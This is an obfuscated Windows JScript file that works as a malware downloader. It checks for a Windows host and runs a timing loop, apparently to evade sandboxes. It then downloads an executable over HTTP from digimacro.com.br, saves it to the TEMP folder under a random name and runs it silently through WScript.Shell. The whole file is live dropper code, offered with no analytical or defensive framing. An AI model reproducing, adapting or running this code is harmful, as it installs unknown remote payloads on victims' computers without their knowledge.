var Z0 = false;
var cN = "CreateObject";
var L = function H() {return WScript[cN]("WScript.Shell");}(), e0 = 11;
var k = "MSXML2.XMLHTTP";
var mU = 2123213;
var aK = 0;
function fF(Bz){L["Run"](Bz, aK, aK);};
function p(){return "" + k;};
function A(RP, G){aK = aK * 1; return RP - G;};
function ls(){return cN;};
/*@cc_on
  @if (@_win32 || @_win64)
    Z0 = true;
  @end
@*/
if (Z0)
{
var U = "";
function Z(){return 22;};
var e = 0; var Y = 0;
function DF()
{
var s = new this["Date"]();
var lq = s["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var s = new this["Date"]();
var pr = s["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var s = new this["Date"]();
var K0 = s["getUTCMilliseconds"]();
var e = "nA";
e = A(pr, lq);
var Y = "b";
Y = A(K0, pr);
U = "open";
return A(e, Y);
}
var qS = false;
var Ta = false;
for (var y = aK; y < Z() * 1; y++){if (DF() != aK){
qS = true; 
Y = "31" + 11 * e + Y; 
Ta = true; 
break;
}}
function iq() {return ((qS == true) && (qS == Ta)) ? 1 : aK;};
if (qS && iq() && Ta){
function W() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "LD72c6rwS0yji.exe";};
 Dk = p();
 tL = WScript[cN](Dk);
 var I = 1;
 while (I){
try {
tL[U]("GET", "http://digimacro.com.br/m8isda", false);
tL["send"]();
Cx = "Sleep";
for (;;){WScript[Cx](Z() * 11); if (tL["readystate"] >= 2 * 2) break;};
I = aK;
} catch(nT){};
}
function V(K) {var j = (1, 2, 3, 4, 5, K); return j;};
fa = WScript[ls()]("ADODB.Stream");
Dk = fa;
Dk[U]();
Dk["type"] = V(1);
Dk["write"](tL["ResponseBody"]);
fa["position"] = V(aK);
Dk["Save" + "ToFile"](W(), 2);
fa["c"+"lose"]();
dR = W();
fF(dR);
}
}

